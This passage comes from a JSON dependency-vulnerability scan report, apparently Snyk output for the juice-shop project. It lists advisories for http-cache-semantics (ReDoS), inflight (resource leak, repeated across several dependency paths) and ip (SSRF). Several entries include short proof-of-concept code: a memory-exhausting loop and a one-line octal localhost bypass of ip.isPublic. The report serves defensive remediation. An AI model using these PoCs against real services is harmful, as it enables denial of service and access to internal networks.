it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `http-cache-semantics` to version 4.1.1 or higher.\n## References\n- [GitHub Commit](https://github.com/kornelski/http-cache-semantics/commit/560b2d8ef452bbba20ffed69dc155d63ac757b74)\n- [Vulnerable Code](https://github.com/kornelski/http-cache-semantics/blob/master/index.js#L83)\n",
        "epssDetails": {
          "percentile": "0.37498",
          "probability": "0.00159",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2022-25881"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-8x6c-cv3v-vp6g",
            "GHSA-rc47-6667-2j5j"
          ]
        },
        "packageName": "http-cache-semantics",
        "proprietary": true,
        "creationTime": "2023-01-26T15:43:26.870465Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2023-01-26T15:40:19Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2023-01-30T14:39:52.807542Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-02-16T14:02:23.374199Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "download@8.0.0",
          "got@8.3.2",
          "cacheable-request@2.1.4",
          "http-cache-semantics@3.8.1"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "http-cache-semantics",
        "version": "3.8.1"
      },
      {
        "id": "SNYK-JS-INFLIGHT-6095116",
        "title": "Missing Release of Resource after Effective Lifetime",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "jkomyno"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.2,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "inflight",
        "references": [
          {
            "url": "https://github.com/isaacs/inflight/issues/5",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/logdna/logdna-agent/pull/157",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-13T12:24:01.140165Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Missing Release of Resource after Effective Lifetime via the `makeres` function due to improperly deleting keys from the `reqs` object after execution of callbacks. This behavior causes the keys to remain in the `reqs` object, which leads to resource exhaustion.\r\n\r\nExploiting this vulnerability results in crashing the `node` process or in the application crash.\r\n\r\n**Note:**\r\nThis library is not maintained, and currently, there is no fix for this issue. To overcome this vulnerability, several dependent packages have eliminated the use of this library.\r\n\r\nTo trigger the memory leak, an attacker would need to have the ability to execute or influence the asynchronous operations that use the inflight module within the application. This typically requires access to the internal workings of the server or application, which is not commonly exposed to remote users. Therefore, “Attack vector” is marked as “Local”.\n## PoC\n```js\r\nconst inflight = require('inflight');\r\n\r\nfunction testInflight() {\r\n  let i = 0;\r\n  function scheduleNext() {\r\n    let key = `key-${i++}`;\r\n    const callback = () => {\r\n    };\r\n    for (let j = 0; j < 1000000; j++) {\r\n      inflight(key, callback);\r\n    }\r\n\r\n    setImmediate(scheduleNext);\r\n  }\r\n\r\n\r\n  if (i % 100 === 0) {\r\n    console.log(process.memoryUsage());\r\n  }\r\n\r\n  scheduleNext();\r\n}\r\n\r\ntestInflight();\r\n```\n## Remediation\nThere is no fixed version for `inflight`.\n## References\n- [GitHub Issue](https://github.com/isaacs/inflight/issues/5)\n- [GitHub PR](https://github.com/logdna/logdna-agent/pull/157)\n",
        "epssDetails": null,
        "identifiers": {
          "CVE": [],
          "CWE": [
            "CWE-772"
          ]
        },
        "packageName": "inflight",
        "proprietary": false,
        "creationTime": "2023-11-30T12:51:43.483198Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2023-11-28T12:47:27Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2023-11-30T12:52:55.469185Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-13T12:24:01.140165Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "grunt@1.6.1",
          "glob@7.1.7",
          "inflight@1.0.6"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "inflight",
        "version": "1.0.6"
      },
      {
        "id": "SNYK-JS-INFLIGHT-6095116",
        "title": "Missing Release of Resource after Effective Lifetime",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "jkomyno"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.2,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "inflight",
        "references": [
          {
            "url": "https://github.com/isaacs/inflight/issues/5",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/logdna/logdna-agent/pull/157",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-13T12:24:01.140165Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Missing Release of Resource after Effective Lifetime via the `makeres` function due to improperly deleting keys from the `reqs` object after execution of callbacks. This behavior causes the keys to remain in the `reqs` object, which leads to resource exhaustion.\r\n\r\nExploiting this vulnerability results in crashing the `node` process or in the application crash.\r\n\r\n**Note:**\r\nThis library is not maintained, and currently, there is no fix for this issue. To overcome this vulnerability, several dependent packages have eliminated the use of this library.\r\n\r\nTo trigger the memory leak, an attacker would need to have the ability to execute or influence the asynchronous operations that use the inflight module within the application. This typically requires access to the internal workings of the server or application, which is not commonly exposed to remote users. Therefore, “Attack vector” is marked as “Local”.\n## PoC\n```js\r\nconst inflight = require('inflight');\r\n\r\nfunction testInflight() {\r\n  let i = 0;\r\n  function scheduleNext() {\r\n    let key = `key-${i++}`;\r\n    const callback = () => {\r\n    };\r\n    for (let j = 0; j < 1000000; j++) {\r\n      inflight(key, callback);\r\n    }\r\n\r\n    setImmediate(scheduleNext);\r\n  }\r\n\r\n\r\n  if (i % 100 === 0) {\r\n    console.log(process.memoryUsage());\r\n  }\r\n\r\n  scheduleNext();\r\n}\r\n\r\ntestInflight();\r\n```\n## Remediation\nThere is no fixed version for `inflight`.\n## References\n- [GitHub Issue](https://github.com/isaacs/inflight/issues/5)\n- [GitHub PR](https://github.com/logdna/logdna-agent/pull/157)\n",
        "epssDetails": null,
        "identifiers": {
          "CVE": [],
          "CWE": [
            "CWE-772"
          ]
        },
        "packageName": "inflight",
        "proprietary": false,
        "creationTime": "2023-11-30T12:51:43.483198Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2023-11-28T12:47:27Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2023-11-30T12:52:55.469185Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-13T12:24:01.140165Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "ts-node-dev@1.1.8",
          "rimraf@2.7.1",
          "glob@7.2.3",
          "inflight@1.0.6"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "inflight",
        "version": "1.0.6"
      },
      {
        "id": "SNYK-JS-INFLIGHT-6095116",
        "title": "Missing Release of Resource after Effective Lifetime",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "jkomyno"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.2,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "inflight",
        "references": [
          {
            "url": "https://github.com/isaacs/inflight/issues/5",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/logdna/logdna-agent/pull/157",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-13T12:24:01.140165Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Missing Release of Resource after Effective Lifetime via the `makeres` function due to improperly deleting keys from the `reqs` object after execution of callbacks. This behavior causes the keys to remain in the `reqs` object, which leads to resource exhaustion.\r\n\r\nExploiting this vulnerability results in crashing the `node` process or in the application crash.\r\n\r\n**Note:**\r\nThis library is not maintained, and currently, there is no fix for this issue. To overcome this vulnerability, several dependent packages have eliminated the use of this library.\r\n\r\nTo trigger the memory leak, an attacker would need to have the ability to execute or influence the asynchronous operations that use the inflight module within the application. This typically requires access to the internal workings of the server or application, which is not commonly exposed to remote users. Therefore, “Attack vector” is marked as “Local”.\n## PoC\n```js\r\nconst inflight = require('inflight');\r\n\r\nfunction testInflight() {\r\n  let i = 0;\r\n  function scheduleNext() {\r\n    let key = `key-${i++}`;\r\n    const callback = () => {\r\n    };\r\n    for (let j = 0; j < 1000000; j++) {\r\n      inflight(key, callback);\r\n    }\r\n\r\n    setImmediate(scheduleNext);\r\n  }\r\n\r\n\r\n  if (i % 100 === 0) {\r\n    console.log(process.memoryUsage());\r\n  }\r\n\r\n  scheduleNext();\r\n}\r\n\r\ntestInflight();\r\n```\n## Remediation\nThere is no fixed version for `inflight`.\n## References\n- [GitHub Issue](https://github.com/isaacs/inflight/issues/5)\n- [GitHub PR](https://github.com/logdna/logdna-agent/pull/157)\n",
        "epssDetails": null,
        "identifiers": {
          "CVE": [],
          "CWE": [
            "CWE-772"
          ]
        },
        "packageName": "inflight",
        "proprietary": false,
        "creationTime": "2023-11-30T12:51:43.483198Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2023-11-28T12:47:27Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2023-11-30T12:52:55.469185Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-13T12:24:01.140165Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "node-pre-gyp@0.15.0",
          "rimraf@2.7.1",
          "glob@7.2.3",
          "inflight@1.0.6"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "inflight",
        "version": "1.0.6"
      },
      {
        "id": "SNYK-JS-INFLIGHT-6095116",
        "title": "Missing Release of Resource after Effective Lifetime",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "jkomyno"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.2,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "inflight",
        "references": [
          {
            "url": "https://github.com/isaacs/inflight/issues/5",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/logdna/logdna-agent/pull/157",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-13T12:24:01.140165Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Missing Release of Resource after Effective Lifetime via the `makeres` function due to improperly deleting keys from the `reqs` object after execution of callbacks. This behavior causes the keys to remain in the `reqs` object, which leads to resource exhaustion.\r\n\r\nExploiting this vulnerability results in crashing the `node` process or in the application crash.\r\n\r\n**Note:**\r\nThis library is not maintained, and currently, there is no fix for this issue. To overcome this vulnerability, several dependent packages have eliminated the use of this library.\r\n\r\nTo trigger the memory leak, an attacker would need to have the ability to execute or influence the asynchronous operations that use the inflight module within the application. This typically requires access to the internal workings of the server or application, which is not commonly exposed to remote users. Therefore, “Attack vector” is marked as “Local”.\n## PoC\n```js\r\nconst inflight = require('inflight');\r\n\r\nfunction testInflight() {\r\n  let i = 0;\r\n  function scheduleNext() {\r\n    let key = `key-${i++}`;\r\n    const callback = () => {\r\n    };\r\n    for (let j = 0; j < 1000000; j++) {\r\n      inflight(key, callback);\r\n    }\r\n\r\n    setImmediate(scheduleNext);\r\n  }\r\n\r\n\r\n  if (i % 100 === 0) {\r\n    console.log(process.memoryUsage());\r\n  }\r\n\r\n  scheduleNext();\r\n}\r\n\r\ntestInflight();\r\n```\n## Remediation\nThere is no fixed version for `inflight`.\n## References\n- [GitHub Issue](https://github.com/isaacs/inflight/issues/5)\n- [GitHub PR](https://github.com/logdna/logdna-agent/pull/157)\n",
        "epssDetails": null,
        "identifiers": {
          "CVE": [],
          "CWE": [
            "CWE-772"
          ]
        },
        "packageName": "inflight",
        "proprietary": false,
        "creationTime": "2023-11-30T12:51:43.483198Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2023-11-28T12:47:27Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2023-11-30T12:52:55.469185Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-13T12:24:01.140165Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "sqlite3@5.1.7",
          "node-gyp@8.4.1",
          "glob@7.2.3",
          "inflight@1.0.6"
        ],
        "upgradePath": [
          false,
          "sqlite3@5.1.7"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "inflight",
        "version": "1.0.6"
      },
      {
        "id": "SNYK-JS-INFLIGHT-6095116",
        "title": "Missing Release of Resource after Effective Lifetime",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "jkomyno"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.2,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "inflight",
        "references": [
          {
            "url": "https://github.com/isaacs/inflight/issues/5",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/logdna/logdna-agent/pull/157",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-13T12:24:01.140165Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Missing Release of Resource after Effective Lifetime via the `makeres` function due to improperly deleting keys from the `reqs` object after execution of callbacks. This behavior causes the keys to remain in the `reqs` object, which leads to resource exhaustion.\r\n\r\nExploiting this vulnerability results in crashing the `node` process or in the application crash.\r\n\r\n**Note:**\r\nThis library is not maintained, and currently, there is no fix for this issue. To overcome this vulnerability, several dependent packages have eliminated the use of this library.\r\n\r\nTo trigger the memory leak, an attacker would need to have the ability to execute or influence the asynchronous operations that use the inflight module within the application. This typically requires access to the internal workings of the server or application, which is not commonly exposed to remote users. Therefore, “Attack vector” is marked as “Local”.\n## PoC\n```js\r\nconst inflight = require('inflight');\r\n\r\nfunction testInflight() {\r\n  let i = 0;\r\n  function scheduleNext() {\r\n    let key = `key-${i++}`;\r\n    const callback = () => {\r\n    };\r\n    for (let j = 0; j < 1000000; j++) {\r\n      inflight(key, callback);\r\n    }\r\n\r\n    setImmediate(scheduleNext);\r\n  }\r\n\r\n\r\n  if (i % 100 === 0) {\r\n    console.log(process.memoryUsage());\r\n  }\r\n\r\n  scheduleNext();\r\n}\r\n\r\ntestInflight();\r\n```\n## Remediation\nThere is no fixed version for `inflight`.\n## References\n- [GitHub Issue](https://github.com/isaacs/inflight/issues/5)\n- [GitHub PR](https://github.com/logdna/logdna-agent/pull/157)\n",
        "epssDetails": null,
        "identifiers": {
          "CVE": [],
          "CWE": [
            "CWE-772"
          ]
        },
        "packageName": "inflight",
        "proprietary": false,
        "creationTime": "2023-11-30T12:51:43.483198Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2023-11-28T12:47:27Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2023-11-30T12:52:55.469185Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-13T12:24:01.140165Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "grunt-contrib-compress@1.6.0",
          "archiver@1.3.0",
          "archiver-utils@1.3.0",
          "glob@7.2.3",
          "inflight@1.0.6"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "inflight",
        "version": "1.0.6"
      },
      {
        "id": "SNYK-JS-INFLIGHT-6095116",
        "title": "Missing Release of Resource after Effective Lifetime",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "jkomyno"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.2,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "inflight",
        "references": [
          {
            "url": "https://github.com/isaacs/inflight/issues/5",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/logdna/logdna-agent/pull/157",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-13T12:24:01.140165Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Missing Release of Resource after Effective Lifetime via the `makeres` function due to improperly deleting keys from the `reqs` object after execution of callbacks. This behavior causes the keys to remain in the `reqs` object, which leads to resource exhaustion.\r\n\r\nExploiting this vulnerability results in crashing the `node` process or in the application crash.\r\n\r\n**Note:**\r\nThis library is not maintained, and currently, there is no fix for this issue. To overcome this vulnerability, several dependent packages have eliminated the use of this library.\r\n\r\nTo trigger the memory leak, an attacker would need to have the ability to execute or influence the asynchronous operations that use the inflight module within the application. This typically requires access to the internal workings of the server or application, which is not commonly exposed to remote users. Therefore, “Attack vector” is marked as “Local”.\n## PoC\n```js\r\nconst inflight = require('inflight');\r\n\r\nfunction testInflight() {\r\n  let i = 0;\r\n  function scheduleNext() {\r\n    let key = `key-${i++}`;\r\n    const callback = () => {\r\n    };\r\n    for (let j = 0; j < 1000000; j++) {\r\n      inflight(key, callback);\r\n    }\r\n\r\n    setImmediate(scheduleNext);\r\n  }\r\n\r\n\r\n  if (i % 100 === 0) {\r\n    console.log(process.memoryUsage());\r\n  }\r\n\r\n  scheduleNext();\r\n}\r\n\r\ntestInflight();\r\n```\n## Remediation\nThere is no fixed version for `inflight`.\n## References\n- [GitHub Issue](https://github.com/isaacs/inflight/issues/5)\n- [GitHub PR](https://github.com/logdna/logdna-agent/pull/157)\n",
        "epssDetails": null,
        "identifiers": {
          "CVE": [],
          "CWE": [
            "CWE-772"
          ]
        },
        "packageName": "inflight",
        "proprietary": false,
        "creationTime": "2023-11-30T12:51:43.483198Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2023-11-28T12:47:27Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2023-11-30T12:52:55.469185Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-13T12:24:01.140165Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "unzipper@0.9.15",
          "fstream@1.0.12",
          "rimraf@2.7.1",
          "glob@7.2.3",
          "inflight@1.0.6"
        ],
        "upgradePath": [
          false,
          "unzipper@0.12.1"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "inflight",
        "version": "1.0.6"
      },
      {
        "id": "SNYK-JS-IP-12704893",
        "title": "Server-side Request Forgery (SSRF)",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L/E:P",
        "credit": [
          "Unknown"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "high",
        "cvssScore": 7.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "ip",
        "references": [
          {
            "url": "https://github.com/indutny/node-ip/issues/160",
            "title": "GitHub Issue"
          },
          {
            "url": "https://cosmosofcyberspace.github.io/CVE-Application-Document.html",
            "title": "Security Report"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:C/C:N/I:L/A:N",
            "cvssV3BaseScore": 3.2,
            "modificationTime": "2025-09-17T17:33:25.769932Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:H/SI:H/SA:L/E:P",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 7.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-09-16T17:57:52.698394Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 10,
            "cvssVersion": "3.1",
            "modificationTime": "2025-09-16T17:57:52.698394Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:C/C:N/I:L/A:N",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-09-17T17:33:25.769932Z"
          }
        ],
        "description": "## Overview\n[ip](https://github.com/indutny/node-ip) is a Node library.\n\nAffected versions of this package are vulnerable to Server-side Request Forgery (SSRF) via the `ip.isPublic()` and `ip.isPrivate()` functions. An attacker can interact with internal network resources by supplying specially crafted IP address such as octal localhost format (\"017700000001\") that is incorrectly identified as public.\r\n\r\n**Note:**\r\n\r\nThis issue exists because of an incomplete fix for CVE-2024-29415.\n## PoC\nTest octal localhost bypass:\r\n  \r\n`node -e \"const ip=require('ip'); console.log('017700000001 bypass:', ip.isPublic('017700000001'));\"` - returns `true`\n## Remediation\nThere is no fixed version for `ip`.\n## References\n- [GitHub Issue](https://github.com/indutny/node-ip/issues/160)\n- [Security Report](https://cosmosofcyberspace.github.io/CVE-Application-Document.html)\n",
        "epssDetails": {
          "percentile": "0.02394",
          "probability": "0.00016",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-59436"
          ],
          "CWE": [
            "CWE-918"
          ]
        },
        "packageName": "ip",
        "proprietary": false,
        "creationTime": "2025-09-16T11:05:36.475343Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-09-16T02:44:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-09-16T17:54:26.511100Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-09-17T17:33:25.769932Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "juice-shop@19.0.0",
          "express-ipfilter@1.3.2",
          "ip@2.0.1"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "ip",
        "version": "2.0.1"
      },
      {
        "id": "SNYK-JS-IP-12761655",
        "title": "Server-side Request Forgery (SSRF)",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L/E:P",
        "credit": [
          "Unknown"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "high",
        "cvssScore": 7.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "ip",
        "references": [
          {
            "url": "https://github.com/indutny/node-ip/issues/160",
            "title": "GitHub Issue"
          },
          {
            "url": "https://cosmosofcyberspace.github.io/CVE-Application-Document.html",
            "title": "Security Report"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:H/SI:H/SA:L/E:P",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 7.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-09-16T16:37:35.338154Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 10,
